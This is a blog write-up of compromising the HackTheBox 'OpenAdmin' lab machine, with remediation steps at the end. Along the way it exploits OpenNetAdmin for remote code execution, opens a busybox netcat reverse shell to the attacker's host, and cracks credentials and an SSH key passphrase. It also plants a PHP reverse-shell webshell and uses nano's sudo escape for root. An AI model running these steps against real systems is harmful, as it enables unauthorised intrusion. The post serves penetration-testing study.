---
layout: writeup
title: OpenAdmin - HackTheBox
date: 2024-08-13 13:32:20 +0300
description: A Writeup of the OpenAdmin Box from HackTheBox
image: # /assets/images/OpenAdmin/OpenAdmin.png
fig-caption: # Add figcaption (optional)
tags: [LainKusanagi, Linux]
---

Today I'm doing a writeup for a [Hack The Box](https://app.hackthebox.com/profile/2013658) box from LainKusanagi’s [list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). It is called OpenAdmin, and it is rated Easy by HackTheBox. As usual, we get started with an nmap scan. I'm using my own [custom script](https://github.com/pentestpop/verybasicenum/blob/main/vbnmap.sh) for this which (gives more detail but) shows these open ports:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Looks like we're gonna be dealing with a web app. I go check it out in browser, but I get the Ubuntu Default Page, so it's time for `feroxbuster`.

![OpenAdmin2.png](/assets/images/OpenAdmin/OpenAdmin2.png){: .responsive-image}

After we scan the IP, it looks like there are essentially three directories which act as three different sites - `/music`, `/artwork`, and `/sierra`. 

![OpenAdmin3.png](/assets/images/OpenAdmin/OpenAdmin3.png){: .responsive-image}

They are look like static sites, so it may take some time to poke around. Eventually I click around on the websites and check the Login button in the top right corner of `/music`, and it links to `http://10.10.10.171/ona/ona`.

![OpenAdmin4.png](/assets/images/OpenAdmin/OpenAdmin4.png){: .responsive-image}I note the tab says "OpenNetAdmin", which tracks with the name of the box and is likely what ona stands for. I check exploit-db and find an [RCE](https://www.exploit-db.com/exploits/47691), but I can't get it working. Fortunately the go-getters over at [github dot com](https://github.com/amriunix/ona-rce) have another one cooked up so I clone it to my working directory, and we're off. I check the documentation, run `python3 ona-rce.py exploit http://10.10.10.171/ona` and it shows a shell. I test it with `whoami`, and it responds, so I feed it the busybox shell (`busybox nc 10.10.14.2 445 -e /bin/bash`) to get a proper shell. 

I start looking around, running the usual commands. I see this writeable directory: `/var/www/html/marga/.git`, but we don't have git, and it looks like there's nothing interesting in there. Apparently it was just another site. I notice some interesting privileges for joanna, so hopefully I can get to that user. I see that the machine may be vulnerable to `PwnKit`, though I try to avoid that at first in case it's not the intended path. 

![OpenAdmin5.png](/assets/images/OpenAdmin/OpenAdmin5.png){: .responsive-image}
 
 It also looks like there are a couple of services listening only on localhost. 
 ![OpenAdmin6.png](/assets/images/OpenAdmin/OpenAdmin6.png){: .responsive-image}
![OpenAdmin7.png](/assets/images/OpenAdmin/OpenAdmin7.png){: .responsive-image}

Frankly I suspect the internal site is the way to go, because it just seems crazy that something like that would be set up for a lab and not be the intended path. `PwnKit` will have to wait. 

At this point, I had to take a break for the night, and when I came back OpenNetAdmin was no longer responding. I reverted. I even switch VPNs to another instance. Nothing. That's one of the downsides of HTB I guess, maybe I should have gone for the premium subscription or something because I need the ONA exploit to get back on the machine and can't progress. 

Eventually I get it working again, but ligolo crashed the machine every time, keeping me from forwarding the internal site to my machine to check out. At that point I decided to look around more throughly for a password or something, and I found database credentials: `ona_sys`:`n1nj4W4rri0R!`

![OpenAdmin8.png](/assets/images/OpenAdmin/OpenAdmin8.png){: .responsive-image}

I check out the mysql instance and find this info from the users table in the ona_default database:

![OpenAdmin9.png](/assets/images/OpenAdmin/OpenAdmin9.png){: .responsive-image}

NTH suggests they are MD5 hashes, and hashcat cracks them both as `test`. Not particularly encouraging. That's ok, I tried to `su jimmy`, and the `n1nj4W4rri0R!` password works. So we're moving on. I look around for a little bit, but I can't actually find anything I have new access to to help me find root or joanna's password. Fortunately, after crashing the lab machine again, I determine that I can ssh into it with jimmy. So that means I can perform local port forwarding. The syntax is `ssh -L 52846:127.0.0.1:52846 jimmy@10.10.10.171`. This means that I can use port 52846 on the localhost (127.0.0.1) to access port 52846 on the remote host (10.10.10.171), but I do need to enter jimmy's credentials to do so. After that, I just visit 127.0.0.0.1:52846 in the browser and see this login screen:

![OpenAdmin10.png](/assets/images/OpenAdmin/OpenAdmin10.png){: .responsive-image}

I notice that the tab says `Tutorialspoint.com`, and viewing the source code shows this:
![OpenAdmin11.png](/assets/images/OpenAdmin/OpenAdmin11.png){: .responsive-image}

I start feroxbuster in the background just in case, but it finds nothing of interest. Then I go back to `/var` and find that I now have access to the `/var/www/internal` folder, so I can learn more about the web page. 

![OpenAdmin12.png](/assets/images/OpenAdmin/OpenAdmin12.png){: .responsive-image}

There's nothing of note in logout, and main seems to be showing us joanna's ssh password, so the key is likely in index. 

![OpenAdmin13.png](/assets/images/OpenAdmin/OpenAdmin13.png){: .responsive-image}

Main seems to be giving us a sha512 password and the username of jimmy. So we just need to crack that, and we may be good to go. 

![OpenAdmin14.png](/assets/images/OpenAdmin/OpenAdmin14.png){: .responsive-image}

It cracks pretty quickly as `Revealed`. We enter jimmy:Revealed into the web page, and we do see joanna's id_rsa. 

![OpenAdmin15.png](/assets/images/OpenAdmin/OpenAdmin15.png){: .responsive-image}

But when I copy it, change the permissions (`chmod 600 joanna.id_rsa`), and try to use it, it requires a password. Interesting. Neither `ninja` nor `n1nj4W4rri0R!` works either. So I run `ssh2john joanna.id_rsa > joanna.hash` to get a new hash file, and then run `john joanna.hash` on it. This doesn't work initially, because it doesn't work on john's default wordlist. I change it to rockyou.txt, and we're off. 

![OpenAdmin16.png](/assets/images/OpenAdmin/OpenAdmin16.png){: .responsive-image}

The other option is to simply put a webshell in the /var/www/internal directory and call it from the browser. We can use the classic [Ivan Sincek](https://github.com/ivan-sincek/php-reverse-shell) reverse shell for this. I transfer it over, call it from the browser, and voila. 

![OpenAdmin17.png](/assets/images/OpenAdmin/OpenAdmin17.png){: .responsive-image}

Either way, we get the joanna shell. For whatever reason, when I run `sudo -l` as `joanna`, I get this error.

![OpenAdmin18.png](/assets/images/OpenAdmin/OpenAdmin18.png){: .responsive-image}

But we know from running it previously as `www-data`, we can run nano on /opt/priv as joanna. When I try to run `sudo /bin/nano /opt/priv`, I get the error:

![OpenAdmin19.png](/assets/images/OpenAdmin/OpenAdmin19.png){: .responsive-image}

Interesting. That seemed for sure the path forward. I don't see any new interesting SUID binaries or anything else when I re-run lse. So I get kinda stuck here. 

So then I reset the machine, ssh as joanna again, run `sudo l`, see that I can again run `sudo /bin/nano /opt/priv` and check [GTFOBins](https://gtfobins.github.io/gtfobins/nano/) to find that I can get a root shell by running: 
`sudo nano`
`^R^X`
`reset; sh 1>&0 2>&0`

And boom, I get a root shell. 

![OpenAdmin20.png](/assets/images/OpenAdmin/OpenAdmin20.png){: .responsive-image}

### Lessons Learned
This box took me a ton of time, but most of it was because the box kept crashing. The steps involved for the most part were relatively simple. The things that stuck out as not some much learned as reinforced are:
- Make sure to check every reasonable file for credentials. It took me a while to find the `ona_sys`:`n1nj4W4rri0R!` creds in `/opt/ona/www/local/config/database_settings.inc.php`. To be fair, there were a ton of config-y type files on this machine, but there was a lot of time spent on this one. 
- Use rockyou.txt rather than john's default wordlist. Most labs with like this can be cracked with rockyou, but I missed it with john's default. In real life, might need more targeted lists, but most of the labs, stick with rockyou. 
- I rarely use ssh for port forwarding. Usually I go with ligolo, but that crashed the machine, so nice to get some practice with ssh port forwarding. 

### Remediation Steps
- Patch the version of OpenNetAdmin. 
- Remove plaintext credentials from the database_settings.inc.php file. At the very minimum, it should be protected only to the users who need to access it. 
- Avoid the re-use of credentials for the ona user and jimmy. 
- If possible configure the firewall to prevent port forwarding. 
- Not sure what to say about the internal website as it is clearly CTF-y, but obviously don't put plaintext ssh keys up on a website, even internally. 
- Remove the ability of joanna to run `sudo nano /opt/priv`. That also is pretty CTF-y as that file was clearly not in use, but there it is.